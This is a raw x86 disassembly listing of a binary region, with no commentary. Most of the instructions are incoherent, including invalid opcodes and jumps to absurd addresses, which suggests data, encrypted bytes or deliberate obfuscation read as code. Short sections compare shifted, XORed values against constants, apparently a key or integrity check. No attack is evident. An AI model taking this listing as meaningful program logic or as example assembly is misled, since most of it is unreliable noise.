  41b1d6:	jmp    0x41b1e7
  41b1d8:	adc    esi,DWORD PTR [ebx-0x47]
  41b1db:	xor    DWORD PTR [ebp+ebp*8-0x65],0xffffff9c
  41b1e0:	in     al,0xd0
  41b1e2:	pop    edi
  41b1e3:	and    BYTE PTR [esi],bh
  41b1e5:	cld    
  41b1e6:	outs   dx,DWORD PTR ds:[esi]
  41b1e7:	push   edi
  41b1e8:	cdq    
  41b1e9:	(bad)  
  41b1ea:	nop
  41b1eb:	sbb    BYTE PTR [edi],ch
  41b1ed:	lds    ebx,FWORD PTR [ecx+eax*8]
  41b1f0:	mov    cl,0x1b
  41b1f2:	and    eax,0x857c736b
  41b1f7:	leave  
  41b1f8:	inc    esi
  41b1f9:	jne    0x41b1ed
  41b1fb:	pop    ebx
  41b1fc:	mov    bl,0xfd
  41b1fe:	shl    DWORD PTR [ebp+0x72512500],cl
  41b204:	mov    edx,0xd987eeac
  41b209:	call   0x7a2:0x83730345
  41b210:	add    BYTE PTR ds:0x6c98a474,dl
  41b216:	test   edx,ebp
  41b218:	xor    al,0x39
  41b21a:	push   ebp
  41b21b:	sbb    eax,0x49b3e6b5
  41b220:	jmp    0x3c8a:0xfa9a61d3
  41b227:	int3   
  41b228:	test   BYTE PTR [ecx-0x5f],0x8e
  41b22c:	jge    0x41b265
  41b22e:	add    eax,0x69a890ce
  41b233:	jnp    0x41b200
  41b235:	dec    ebp
  41b236:	in     eax,0x7
  41b238:	fistp  WORD PTR [esp+0x1c97514c]
  41b23f:	fdiv   QWORD PTR [edi]
  41b241:	ja     0x41b271
  41b243:	fstp   TBYTE PTR [eax+0x4a5dea17]
  41b249:	int3   
  41b24a:	int3   
  41b24b:	outs   dx,BYTE PTR ds:[esi]
  41b24c:	push   eax
  41b24d:	lods   eax,DWORD PTR ds:[esi]
  41b24e:	jmp    0x41b2b7
  41b250:	stc    
  41b251:	adc    ecx,esp
  41b253:	out    0x81,eax
  41b255:	out    dx,eax
  41b256:	mov    ebx,0x9c10560c
  41b25b:	mov    dh,0x75
  41b25d:	adc    al,0xc1
  41b25f:	jbe    0x41b1ff
  41b261:	loop   0x41b252
  41b263:	mov    ah,al
  41b265:	stos   DWORD PTR es:[edi],eax
  41b266:	dec    eax
  41b267:	outs   dx,DWORD PTR ds:[esi]
  41b268:	mov    ds:0x45f70fa3,eax
  41b26d:	fild   DWORD PTR [ebx-0x49d142e8]
  41b273:	cmp    eax,0x702cec2e
  41b278:	xlat   BYTE PTR ds:[ebx]
  41b279:	sub    eax,0x66b0b96a
  41b27e:	loopne 0x41b28b
  41b280:	lahf   
  41b281:	(bad)  
  41b282:	in     eax,0x3a
  41b284:	push   es
  41b285:	sbb    BYTE PTR [edi],0x7f
  41b288:	jle    0x41b2aa
  41b28a:	cmp    eax,0x97935b9a
  41b28f:	call   FWORD PTR [ecx]
  41b291:	inc    esp
  41b292:	repz popf 
  41b294:	repnz mov eax,0x8310ddf6
  41b29a:	pop    ebx
  41b29b:	add    DWORD PTR ds:0xa6b373b5,edx
  41b2a1:	stos   DWORD PTR es:[edi],eax
  41b2a2:	mov    al,ds:0x285c6cfb
  41b2a7:	xor    edx,DWORD PTR [edi+0x38]
  41b2aa:	add    al,0x2f
  41b2ac:	test   eax,0x7a0669cd
  41b2b1:	rol    BYTE PTR [ebp+ebp*4+0x31],1
  41b2b5:	fldenv [ebx-0x4d]
  41b2b8:	arpl   WORD PTR [eax+esi*2+0x3a],ax
  41b2bc:	cmp    BYTE PTR [edi-0x36],bh
  41b2bf:	inc    ebp
  41b2c0:	dec    eax
  41b2c1:	lahf   
  41b2c2:	jno    0x41b29e
  41b2c4:	and    al,0x3c
  41b2c6:	mov    DWORD PTR [ecx+0x7f161f3a],0xc1f1a1f8
  41b2d0:	pop    esp
  41b2d1:	popa   
  41b2d2:	imul   esp,edi,0x8e8005c5
  41b2d8:	dec    esi
  41b2d9:	fisub  WORD PTR [edi-0x4b043a17]
  41b2df:	push   0xbfa44983
  41b2e4:	int    0x84
  41b2e6:	inc    ebp
  41b2e7:	pushf  
  41b2e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2e9:	rcr    ebx,0xe2
  41b2ec:	repz mov edx,DWORD PTR ds:0x3db55f49
  41b2f3:	xchg   edi,eax
  41b2f4:	stos   BYTE PTR es:[edi],al
  41b2f5:	mov    ch,0x1f
  41b2f7:	enter  0x48e4,0x5
  41b2fb:	or     dh,0xb9
  41b2fe:	lds    edx,FWORD PTR [ebp-0x67]
  41b301:	je     0x41b324
  41b303:	xor    bh,BYTE PTR [edx-0x5]
  41b306:	xor    DWORD PTR [ecx+0x2e744fd8],ecx
  41b30c:	jp     0x41b371
  41b30e:	or     BYTE PTR [edx],dl
  41b310:	into   
  41b311:	or     DWORD PTR [ecx+esi*4],esi
  41b314:	push   esi
  41b315:	sbb    DWORD PTR [bx+di],esp
  41b318:	jle    0x41b2ce
  41b31a:	(bad)  
  41b31b:	hlt    
  41b31c:	pop    esi
  41b31d:	test   al,0x1a
  41b31f:	and    eax,0xc6cfd6d3
  41b324:	arpl   WORD PTR [ebx+0x61],di
  41b327:	jmp    0x8daf:0x886ba3ef
  41b32e:	repz (bad) 
  41b331:	scas   al,BYTE PTR es:[edi]
  41b332:	inc    edx
  41b333:	fmulp  st(6),st
  41b335:	leave  
  41b336:	arpl   dx,bx
  41b338:	pusha  
  41b339:	or     ecx,ebp
  41b33b:	cld    
  41b33c:	inc    ecx
  41b33d:	xor    edx,0xca79a577
  41b343:	shrd   edx,eax,0x2
  41b347:	shr    eax,0x2
  41b34a:	mov    DWORD PTR [esp+0x34],eax
  41b34e:	mov    eax,DWORD PTR [esp+0x18]
  41b352:	mov    ecx,DWORD PTR [esp+0x1c]
  41b356:	jmp    0x41b725
  41b35b:	push   ecx
  41b35c:	(bad)  
  41b35e:	or     BYTE PTR ds:0xaa1d2104,bl
  41b364:	sbb    BYTE PTR [ebx+0x7c],dh
  41b367:	and    BYTE PTR [eax-0x70448347],0x16
  41b36e:	sbb    BYTE PTR [edx+edx*1+0x3f171818],bh
  41b375:	nop
  41b376:	loopne 0x41b30d
  41b378:	xchg   DWORD PTR [edx-0x63c1f479],edx
  41b37e:	call   FWORD PTR [ebx-0x6e]
  41b381:	or     ebp,DWORD PTR [ebx+ebx*4]
  41b384:	std    
  41b385:	fadd   DWORD PTR [ecx+0x59]
  41b388:	int3   
  41b389:	jnp    0x41b3a3
  41b38b:	outs   dx,DWORD PTR ds:[esi]
  41b38c:	int    0x7
  41b38e:	and    al,0xa3
  41b390:	popa   
  41b391:	adc    esp,DWORD PTR [esi+edi*1]
  41b394:	jecxz  0x41b362
  41b396:	push   esp
  41b397:	hlt    
  41b398:	pop    eax
  41b399:	outs   dx,DWORD PTR ds:[esi]
  41b39a:	rcl    DWORD PTR [ebp-0x566e99bc],0xf8
  41b3a1:	test   DWORD PTR [eax],ecx
  41b3a3:	dec    ecx
  41b3a4:	scas   al,BYTE PTR es:[edi]
  41b3a5:	lds    ebp,FWORD PTR [edi+0x1d40da10]
  41b3ab:	and    al,0x69
  41b3ad:	mov    ?,WORD PTR [ebp+esi*4+0x293d3ffa]
  41b3b4:	xchg   ebx,eax
  41b3b5:	jg     0x41b409
  41b3b7:	imul   ebx,DWORD PTR [edi],0x67713857
  41b3bd:	xchg   ebx,eax
  41b3be:	adc    eax,0x1e637dbe
  41b3c3:	push   eax
  41b3c4:	(bad)  
  41b3c5:	pop    ebx
  41b3c6:	jle    0x41b34f
  41b3c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3c9:	fist   WORD PTR [ecx]
  41b3cb:	(bad)  
  41b3ce:	ds aas 
  41b3d0:	push   ds
  41b3d1:	jno    0x41b3ab
  41b3d3:	add    al,BYTE PTR [ecx+esi*2-0x7]
  41b3d7:	jle    0x41b3c3
  41b3d9:	and    al,0xee
  41b3db:	std    
  41b3dc:	jmp    0x48dc:0xb4dc0b20
  41b3e3:	mov    eax,0x54578880
  41b3e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3e9:	dec    esi
  41b3ea:	mov    bl,0x4d
  41b3ec:	jecxz  0x41b399
  41b3ee:	push   ebx
  41b3ef:	mov    DWORD PTR [ebp-0x19],edx
  41b3f2:	aas    
  41b3f3:	mov    al,0xa1
  41b3f5:	lods   al,BYTE PTR ds:[esi]
  41b3f6:	adc    bh,al
  41b3f8:	leave  
  41b3f9:	add    BYTE PTR [esi+0x68],bh
  41b3fc:	adc    eax,0x26b13b21
  41b401:	ins    BYTE PTR es:[edi],dx
  41b402:	dec    ebx
  41b403:	push   ecx
  41b404:	sbb    eax,DWORD PTR [edx-0xc]
  41b407:	jge    0x41b3d6
  41b409:	out    0x35,eax
  41b40b:	mov    edi,0xacf9c9db
  41b410:	mov    al,bl
  41b412:	or     eax,0x55e52119
  41b417:	popa   
  41b418:	or     BYTE PTR [ebx],dh
  41b41a:	push   eax
  41b41b:	push   ebp
  41b41c:	xchg   ecx,eax
  41b41d:	add    al,0xde
  41b41f:	in     eax,0xa5
  41b421:	mov    ah,0x0
  41b423:	inc    ebp
  41b424:	and    edi,DWORD PTR [eax]
  41b426:	push   ss
  41b427:	pusha  
  41b428:	cmp    DWORD PTR [edi*4-0x7d098ea8],0x55
  41b430:	loopne 0x41b420
  41b432:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b433:	stos   DWORD PTR es:[edi],eax
  41b434:	ret    0x84a3
  41b437:	sbb    BYTE PTR [ebx+esi*8-0x399b37b3],bl
  41b43e:	call   0x890ee5ed
  41b443:	jp     0x41b3ea
  41b445:	xchg   edi,eax
  41b446:	test   DWORD PTR [ecx+0x2],edx
  41b449:	nop
  41b44a:	pop    esi
  41b44b:	mov    al,ds:0xff5368ff
  41b450:	sub    esp,DWORD PTR [edx]
  41b452:	imul   esp,DWORD PTR [esi-0x68],0x588cf4f5
  41b459:	inc    eax
  41b45a:	out    dx,al
  41b45b:	pop    ebp
  41b45c:	jge    0x41b419
  41b45e:	cld    
  41b45f:	sub    eax,0x5d6ddbf1
  41b464:	(bad)  
  41b465:	out    0x4b,al
  41b467:	xchg   ebp,eax
  41b468:	imul   edi,edi,0xc4a873d5
  41b46e:	pop    ecx
  41b46f:	xchg   ecx,eax
  41b470:	bound  esi,QWORD PTR [esi+0x43b269c]
  41b476:	daa    
  41b477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b478:	pop    es
  41b479:	push   ecx
  41b47a:	sti    
  41b47b:	(bad)  
  41b47c:	repnz push 0x4573d4df
  41b482:	sti    
  41b483:	inc    eax
  41b484:	xchg   edx,eax
  41b485:	jno    0x41b4a2
  41b487:	add    ebp,DWORD PTR [ebx+0x27]
  41b48a:	std    
  41b48b:	sbb    BYTE PTR [ebp+edi*4+0x27c9772f],dh
  41b492:	xor    ah,BYTE PTR [eax-0x1]
  41b495:	loop   0x41b45e
  41b497:	sbb    bl,ah
  41b499:	test   BYTE PTR [eax+0x4b9ce28f],bh
  41b49f:	xor    DWORD PTR [ebx],0xffffffcf
  41b4a2:	ja     0x41b497
  41b4a4:	jne    0x41b4d5
  41b4a6:	test   al,0x7b
  41b4a8:	mov    fs,WORD PTR [esi+ebp*1+0x10d992bc]
  41b4af:	push   esp
  41b4b0:	ror    ah,cl
  41b4b2:	(bad)  
  41b4b3:	arpl   WORD PTR [ebp+esi*4+0x4b],di
  41b4b7:	xchg   esp,eax
  41b4b8:	pop    esp
  41b4b9:	mov    DWORD PTR [edx+0x5],edi
  41b4bc:	mov    ebx,0x836a4f15
  41b4c1:	fst    DWORD PTR [edi+0x66f2ff26]
  41b4c7:	jmp    0x6db1f20
  41b4cc:	mov    BYTE PTR [esi-0x52],0x17
  41b4d0:	jnp    0x41b4b6
  41b4d2:	xchg   ecx,eax
  41b4d3:	fs dec esp
  41b4d5:	fwait
  41b4d6:	test   al,0xc9
  41b4d8:	xchg   BYTE PTR [esi+0x14],ch
  41b4db:	test   DWORD PTR [esi+0x2018732e],edx
  41b4e1:	out    dx,eax
  41b4e2:	sub    DWORD PTR [ecx],esp
  41b4e4:	dec    ebp
  41b4e5:	mov    ecx,0x2b32f81c
  41b4ea:	pop    ebx
  41b4eb:	fcom   st(0)
  41b4ed:	aam    0xe0
  41b4ef:	sub    eax,0x7a0df14b
  41b4f4:	inc    eax
  41b4f5:	and    bh,bl
  41b4f7:	pop    esp
  41b4f8:	or     ah,BYTE PTR [ebx+0x55]
  41b4fb:	adc    edx,DWORD PTR [edx+esi*1]
  41b4fe:	cmp    DWORD PTR [ecx],esi
  41b500:	pop    eax
  41b501:	adc    dl,bh
  41b503:	retf   
  41b504:	mov    cs,WORD PTR [ecx+0x7c803f40]
  41b50a:	mov    esi,0x506a2ece
  41b50f:	push   esi
  41b510:	mov    ds:0x1ac83ff8,eax
  41b515:	mov    al,0x8f
  41b517:	xor    al,0xa3
  41b519:	jns    0x41b58a
  41b51b:	dec    ebx
  41b51c:	xor    eax,0xdb6e131e
  41b521:	pop    ebp
  41b522:	pusha  
  41b523:	test   eax,0x25ede1d5
  41b528:	cmc    
  41b529:	mov    bl,0xb1
  41b52b:	ds and eax,0xa297bab2
  41b531:	dec    eax
  41b532:	xchg   ebp,eax
  41b533:	mov    ebp,0xd64bc619
  41b538:	mov    eax,0xf6760c61
  41b53d:	xchg   esp,eax
  41b53e:	add    eax,0xbce5813f
  41b543:	add    dh,bh
  41b545:	ja     0x41b5ad
  41b547:	popa   
  41b548:	push   ds
  41b549:	sbb    eax,0x6236552a
  41b54e:	and    al,BYTE PTR [edx]
  41b550:	lea    esi,[ecx]
  41b552:	sbb    edi,DWORD PTR [ebp+0x50cec1bf]
  41b558:	mov    edi,0x53e6f83e
  41b55d:	enter  0xd9c8,0x2a
  41b561:	or     DWORD PTR [edx],ebp
  41b563:	mov    bh,0xc0
  41b565:	mov    cl,0x66
  41b567:	call   0x6a90:0x3bbe0849
  41b56e:	cmp    al,0x1a
  41b570:	pop    esp
  41b571:	ins    BYTE PTR es:[edi],dx
  41b572:	outs   dx,BYTE PTR ds:[esi]
  41b573:	push   ds
  41b574:	xchg   eax,ecx
  41b576:	cmp    al,0xbf
  41b578:	xchg   esp,eax
  41b579:	mov    ch,0x81
  41b57b:	loope  0x41b5a9
  41b57d:	fcomp  DWORD PTR [edx-0x5d]
  41b580:	ja     0x41b5d9
  41b582:	call   0xe280:0xb2104b7a
  41b589:	inc    edx
  41b58a:	inc    ebx
  41b58b:	mov    ebp,DWORD PTR [esi+0x51f1f51f]
  41b591:	lahf   
  41b592:	mov    ds:0x963ec39a,eax
  41b597:	pop    ecx
  41b598:	inc    edx
  41b599:	or     DWORD PTR [ecx],0x86b7681a
  41b59f:	icebp  
  41b5a0:	add    edx,edx
  41b5a2:	sbb    ch,BYTE PTR [edx]
  41b5a4:	pop    ecx
  41b5a5:	sahf   
  41b5a6:	retf   
  41b5a7:	xchg   edi,eax
  41b5a8:	inc    esi
  41b5a9:	xor    BYTE PTR [ebp+ecx*8+0x69],ah
  41b5ad:	mov    BYTE PTR ds:0x29b0174d,bl
  41b5b3:	or     BYTE PTR [ecx],dl
  41b5b5:	pop    esi
  41b5b6:	mov    esi,0xdf1ee51e
  41b5bb:	or     edx,eax
  41b5bd:	out    0xb1,al
  41b5bf:	sbb    al,0xdf
  41b5c1:	mov    eax,0xdc807410
  41b5c6:	popa   
  41b5c7:	push   eax
  41b5c8:	sub    eax,0x5986258
  41b5cd:	sub    al,0xbb
  41b5cf:	inc    edx
  41b5d0:	pusha  
  41b5d1:	stos   DWORD PTR es:[edi],eax
  41b5d2:	push   es
  41b5d3:	sub    al,ch
  41b5d5:	pop    ebx
  41b5d6:	push   0x82ebf318
  41b5db:	in     al,dx
  41b5dc:	xchg   ecx,eax
  41b5dd:	ret    
  41b5de:	mov    esi,0x2d6fff3e
  41b5e3:	stc    
  41b5e4:	loope  0x41b5e9
  41b5e6:	xchg   ebx,eax
  41b5e7:	sar    DWORD PTR [esi-0x896758e],cl
  41b5ed:	xor    eax,0xa259acf1
  41b5f2:	shl    DWORD PTR [edx],cl
  41b5f4:	sti    
  41b5f5:	jmp    0x41b63b
  41b5f7:	call   0xb9f3f269
  41b5fc:	fdiv   DWORD PTR [ecx+0x64a02bd0]
  41b602:	jg     0x41b67a
  41b604:	cmp    eax,0x2a453ef3
  41b609:	push   edi
  41b60a:	dec    ecx
  41b60b:	bsr    esp,DWORD PTR [eax]
  41b60e:	stc    
  41b60f:	dec    ecx
  41b610:	mov    ecx,0xc6303233
  41b615:	jmp    0x41b61e
  41b617:	jo     0x41b5a3
  41b619:	dec    eax
  41b61a:	push   eax
  41b61b:	daa    
  41b61c:	jp     0x41b5a1
  41b61e:	(bad)  
  41b620:	sbb    DWORD PTR [si+0x551c],0xffffffd9
  41b626:	inc    esp
  41b627:	sbb    ecx,DWORD PTR [ebx-0x58]
  41b62a:	in     eax,0x65
  41b62c:	mov    ds:0x2aad9d02,al
  41b631:	loopne 0x41b635
  41b633:	shl    BYTE PTR [edi-0x1b518b97],0x94
  41b63a:	jl     0x41b617
  41b63c:	ficom  WORD PTR [ebx-0x5e]
  41b63f:	sub    dl,ch
  41b641:	mov    WORD PTR [ecx+0x3c],?
  41b644:	xor    dh,BYTE PTR [esi+esi*2]
  41b647:	lahf   
  41b648:	shl    bh,0x41
  41b64b:	add    bh,0x1e
  41b64e:	xor    al,0x61
  41b650:	jmp    0x41b5d9
  41b652:	jo     0x41b66e
  41b654:	cmc    
  41b655:	fidivr WORD PTR [edx]
  41b657:	dec    ebp
  41b658:	xchg   esi,eax
  41b659:	inc    esp
  41b65a:	out    dx,eax
  41b65b:	pushf  
  41b65c:	xor    cl,dl
  41b65e:	inc    esi
  41b65f:	or     eax,0x503d9e15
  41b664:	pop    esi
  41b665:	mov    bl,0xff
  41b667:	xchg   esp,eax
  41b668:	in     eax,dx
  41b669:	aas    
  41b66a:	inc    edx
  41b66b:	lea    ebx,cs:[ebx+edx*4+0x51]
  41b670:	push   esi
  41b671:	fs mov al,0x74
  41b674:	xor    cl,0xc6
  41b677:	add    DWORD PTR es:[ebx+0x17085198],edi
  41b67e:	cmp    dl,ah
  41b680:	mov    dh,0xac
  41b682:	std    
  41b683:	inc    esi
  41b684:	mov    dh,bh
  41b686:	add    bl,al
  41b688:	nop
  41b689:	inc    esp
  41b68a:	dec    esi
  41b68b:	pop    ds
  41b68c:	dec    ecx
  41b68d:	add    al,0xdb
  41b68f:	pop    esp
  41b690:	stos   BYTE PTR es:[edi],al
  41b691:	sub    BYTE PTR [edx],ch
  41b693:	pop    ds
  41b694:	xchg   DWORD PTR [edi],esp
  41b696:	rol    BYTE PTR [ebx],1
  41b698:	clc    
  41b699:	cmc    
  41b69a:	jle    0x41b6d7
  41b69c:	dec    esp
  41b69d:	push   ebx
  41b69e:	mov    eax,0x50d18cdd
  41b6a3:	pop    edx
  41b6a4:	jno    0x41b640
  41b6a6:	and    DWORD PTR [ecx-0x24de1780],esi
  41b6ac:	push   ds
  41b6ad:	and    cl,BYTE PTR [ebp-0x54ec71da]
  41b6b3:	inc    esp
  41b6b4:	adc    esi,DWORD PTR [eax]
  41b6b6:	mov    dl,0xe8
  41b6b8:	xchg   ecx,eax
  41b6b9:	and    bl,BYTE PTR [esi]
  41b6bb:	push   esp
  41b6bc:	lods   eax,DWORD PTR ds:[esi]
  41b6bd:	(bad)  
  41b6be:	lock cmp eax,0x7e68481c
  41b6c4:	nop
  41b6c5:	add    BYTE PTR [edi],bl
  41b6c7:	mov    dh,0x27
  41b6c9:	pop    edx
  41b6ca:	(bad)  
  41b6cb:	xchg   edx,eax
  41b6cc:	dec    esp
  41b6cd:	in     al,dx
  41b6ce:	leave  
  41b6cf:	inc    eax
  41b6d0:	cmp    eax,DWORD PTR [edx+0x49eec75d]
  41b6d6:	mov    eax,0xa7dd36fa
  41b6db:	mov    bh,0x1b
  41b6dd:	jnp    0x41b732
  41b6df:	call   0x22da:0x779a33ac
  41b6e6:	mov    ecx,ebx
  41b6e8:	fiadd  DWORD PTR [ebx]
  41b6ea:	add    bl,BYTE PTR [ecx]
  41b6ec:	mov    esp,0x2bfd4f73
  41b6f1:	pop    edi
  41b6f2:	cdq    
  41b6f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6f4:	lock aam 0x1b
  41b6f7:	addr16 push cs
  41b6f9:	lds    ecx,FWORD PTR [ebp+ebx*1-0x3ad1381c]
  41b700:	mov    ecx,0x560bfce4
  41b705:	mov    esi,0x49933c74
  41b70a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b70b:	mov    ds:0xfa30bd46,eax
  41b710:	push   edi
  41b711:	jnp    0x41b704
  41b713:	loopne 0x41b71b
  41b715:	xchg   ebx,eax
  41b716:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b717:	retf   
  41b718:	push   eax
  41b719:	sbb    BYTE PTR [edx+0xd],cl
  41b71c:	or     esi,ecx
  41b71e:	sar    DWORD PTR [eax+0x1c23fc51],1
  41b724:	jg     0x41b6e7
  41b726:	loopne 0x41b746
  41b728:	xor    eax,0x40000000
  41b72d:	or     eax,DWORD PTR [esp+0x34]
  41b731:	xor    ecx,ecx
  41b733:	mov    DWORD PTR [esp+0x14],eax
  41b737:	mov    eax,DWORD PTR [esp+0x60]
  41b73b:	or     ecx,edx
  41b73d:	cdq    
  41b73e:	cmp    ecx,eax
  41b740:	jne    0x41d926
  41b746:	cmp    DWORD PTR [esp+0x14],edx
  41b74a:	jne    0x41d926
  41b750:	mov    DWORD PTR [esp+0x5c],0x422604
  41b758:	mov    DWORD PTR [esp+0x68],0x4225fc
  41b760:	mov    eax,DWORD PTR [esp+0x78]
  41b764:	mov    eax,DWORD PTR [esp+0x78]
  41b768:	mov    edx,DWORD PTR [esp+0x18]
  41b76c:	xor    ecx,ecx
  41b76e:	shld   ecx,eax,0x2
  41b772:	shl    eax,0x2
  41b775:	mov    DWORD PTR [esp+0x10],edx
  41b779:	mov    edx,DWORD PTR [esp+0x1c]
  41b77d:	xor    eax,ebx
  41b77f:	xor    ecx,esi
  41b781:	mov    DWORD PTR [esp+0x14],edx
  41b785:	cmp    DWORD PTR [esp+0x10],eax
  41b789:	jne    0x41c8ee
  41b78f:	cmp    edx,ecx
  41b791:	jne    0x41c8ee
  41b797:	mov    DWORD PTR [esp+0x30],0x42258c
  41b79f:	mov    eax,DWORD PTR [esp+0x18]
  41b7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41b7a7:	shrd   eax,ecx,0x2
  41b7ab:	shr    ecx,0x2
  41b7ae:	mov    ecx,DWORD PTR [esp+0x18]
  41b7b2:	mov    edx,DWORD PTR [esp+0x1c]
  41b7b6:	mov    edx,DWORD PTR [esp+0x30]
  41b7ba:	mov    edx,DWORD PTR [edx+0xc]
  41b7bd:	mov    DWORD PTR [esp+0xc],eax
  41b7c1:	shl    ecx,0x1e
  41b7c4:	mov    eax,0x329e695d
  41b7c9:	xor    DWORD PTR [esp+0xc],eax
  41b7cd:	xor    ecx,ecx
  41b7cf:	or     ecx,DWORD PTR [esp+0xc]
  41b7d3:	cmp    ecx,DWORD PTR [edx]
  41b7d5:	jne    0x41c888
  41b7db:	mov    ecx,0x65c7
  41b7e0:	mov    WORD PTR [esp+0x2c],cx
  41b7e5:	mov    ecx,0x6062
  41b7ea:	mov    WORD PTR [esp+0x24],cx
  41b7ef:	mov    ecx,0x125d
  41b7f4:	mov    WORD PTR [esp+0xc],cx
  41b7f9:	movzx  ecx,WORD PTR [esp+0xc]
  41b7fe:	mov    edx,0x2d0f
  41b803:	jmp    0x41bbd2
  41b808:	push   edi
  41b809:	and    BYTE PTR [ebx+0x236a9a6f],bh
  41b80f:	and    BYTE PTR [edx-0x4455d674],dh
  41b815:	xchg   esp,eax
  41b816:	jg     0x41b7c8
  41b818:	pop    esi
  41b819:	mov    DWORD PTR [esi],edx
  41b81b:	sbb    BYTE PTR [edx+edx*1-0x1207e7e8],bh
  41b822:	mov    bh,0x2f
  41b824:	cmp    eax,0x5276fb19
  41b829:	js     0x41b89f
  41b82b:	outs   dx,BYTE PTR ds:[esi]
  41b82c:	mov    DWORD PTR [edx],ebx
  41b82e:	frstor [edx]
  41b830:	call   0xb223:0xa0fe85be
  41b837:	add    DWORD PTR [ecx+ebp*2],ecx
  41b83a:	es into 
  41b83c:	fucomp st(5)
  41b83e:	xchg   edx,eax
  41b83f:	mov    eax,0x8b8b90bc
  41b844:	adc    eax,DWORD PTR [eax]
  41b846:	xchg   ebx,eax
  41b847:	xchg   ebx,eax
  41b848:	js     0x41b87b
  41b84a:	retf   
  41b84b:	add    ebx,0x3dab6bf8
  41b851:	repz sbb al,0x60
  41b854:	call   0xb8a26c7
  41b859:	sbb    eax,0xbd5be185
  41b85e:	jge    0x41b8ce
  41b860:	mov    ebx,0xd68a5995
  41b865:	inc    ebp
  41b866:	dec    ebx
  41b867:	and    al,0x94
  41b869:	mov    dl,0x8b
  41b86b:	push   edi
  41b86c:	sub    ah,BYTE PTR [edi]
  41b86e:	pop    esp
  41b86f:	or     edx,DWORD PTR [edi]
  41b871:	ins    BYTE PTR es:[edi],dx
  41b872:	clc    
  41b873:	daa    
  41b874:	cmp    ch,al
  41b876:	jae    0x41b8ed
  41b878:	lods   eax,DWORD PTR ds:[esi]
  41b879:	imul   esi,DWORD PTR [ebx+0x60],0x2c
  41b87d:	nop
  41b87e:	xchg   esp,eax
  41b87f:	sar    DWORD PTR [esi+0x7bad4a99],0xa9
  41b886:	call   0x935372e
  41b88b:	and    bh,0xe8
  41b88e:	mov    ebx,0x56192c8f
  41b893:	pop    edi
  41b894:	mov    eax,ds:0x738a00c3
  41b899:	pop    ecx
  41b89a:	add    BYTE PTR [ebp-0x72e48f32],0xb7
  41b8a1:	and    DWORD PTR [edi-0x3b109a8e],0xe320ada5
  41b8ab:	jb     0x41b8e9
  41b8ad:	rcr    BYTE PTR [ebp+0x4a],0xcd
  41b8b1:	sub    BYTE PTR [esi],al
  41b8b3:	call   0x73d7:0x6400c4eb
  41b8ba:	nop
  41b8bb:	or     eax,0x58455d86
  41b8c0:	dec    ebp
  41b8c1:	clc    
  41b8c2:	sub    edx,DWORD PTR [ebp-0x4e]
  41b8c5:	mov    esp,DWORD PTR [edx-0x5e9977b6]
  41b8cb:	test   eax,0x1ac1ec90
  41b8d0:	mov    cl,0x91
  41b8d2:	add    ebp,DWORD PTR [esi+esi*8-0x252b9030]
  41b8d9:	lea    ecx,[ebx+0x254809a7]
  41b8df:	ss out dx,eax
  41b8e1:	dec    edi
  41b8e2:	or     al,0x31
  41b8e4:	dec    esp
  41b8e5:	data16 mov ds:0x43aa1dd2,al
  41b8eb:	sbb    al,0x94
  41b8ed:	push   edi
  41b8ee:	rol    BYTE PTR [esi+0x1970ed63],cl
  41b8f4:	xchg   BYTE PTR [edi-0x76f0ac03],bh
  41b8fa:	ins    BYTE PTR es:[edi],dx
  41b8fb:	test   eax,0x856b6964
  41b900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b901:	imul   eax,edi,0x7c9cdbd8
  41b907:	aaa    
  41b908:	jne    0x41b8c7
  41b90a:	(bad)  
  41b90b:	xlat   BYTE PTR ds:[ebx]
  41b90c:	jb     0x41b8e3
  41b90e:	shl    edx,1
  41b910:	jae    0x41b8d4
  41b912:	adc    al,BYTE PTR [ebx+0x388ff295]
  41b918:	sbb    BYTE PTR [edi],dh
  41b91a:	mov    al,ds:0xcbffd3f
  41b91f:	mov    BYTE PTR [eax+esi*4],bh
  41b922:	xchg   edx,eax
  41b923:	mov    ebx,0xa0174612
  41b928:	dec    esp
  41b929:	fwait
  41b92a:	stc    
  41b92b:	mov    esp,0x8c2d4e18
  41b930:	repnz push esp
  41b932:	(bad)  
  41b934:	push   esi
  41b935:	rol    BYTE PTR [eax],cl
  41b937:	pop    ds
  41b938:	outs   dx,DWORD PTR ds:[esi]
  41b939:	ret    
  41b93a:	xor    DWORD PTR [edx-0x4fff5d8f],esi
  41b940:	stc    
  41b941:	jno    0x41b9ae
  41b943:	out    dx,eax
  41b944:	xchg   esi,eax
  41b945:	dec    ecx
  41b946:	int3   
  41b947:	imul   esp,DWORD PTR [edx+0x20],0xffffff86
  41b94b:	jp     0x41b8e8
  41b94d:	test   DWORD PTR [eax+0x53f88d39],edi
  41b953:	loopne 0x41b965
  41b955:	out    0x4c,al
  41b957:	mov    ebx,0x722b7751
  41b95c:	in     eax,dx
  41b95d:	test   DWORD PTR [eax],0x2ea2993
  41b963:	cmc    
  41b964:	pop    ebx
  41b965:	adc    ecx,DWORD PTR [ebp+0x7249de76]
  41b96b:	push   cs
  41b96c:	sbb    eax,0x7f85b879
  41b971:	mov    dl,0xf0
  41b973:	pop    edi
  41b974:	clc    
  41b975:	dec    esp
  41b976:	aam    0x89
  41b978:	test   al,0xc5
  41b97a:	cmp    eax,DWORD PTR [eax-0x37]
  41b97d:	xchg   ecx,eax
  41b97e:	jne    0x41b99f
  41b980:	mov    DWORD PTR [esi+edi*1],ecx
  41b983:	xor    ah,bh
  41b985:	pop    edx
  41b986:	sub    dl,BYTE PTR [ebp-0x4c8168e2]
  41b98c:	pusha  
  41b98d:	pop    esp
  41b98e:	xchg   BYTE PTR [esi],bh
  41b990:	inc    ebp
  41b991:	dec    edi
  41b992:	nop
  41b993:	mov    DWORD PTR [ecx],edi
  41b995:	jo     0x41b968
  41b997:	dec    ebx
  41b998:	jp     0x41b9ab
  41b99a:	or     BYTE PTR [edx+0x17],cl
  41b99d:	fnstenv [edi]
  41b99f:	shr    DWORD PTR [edx+esi*8-0x2f],cl
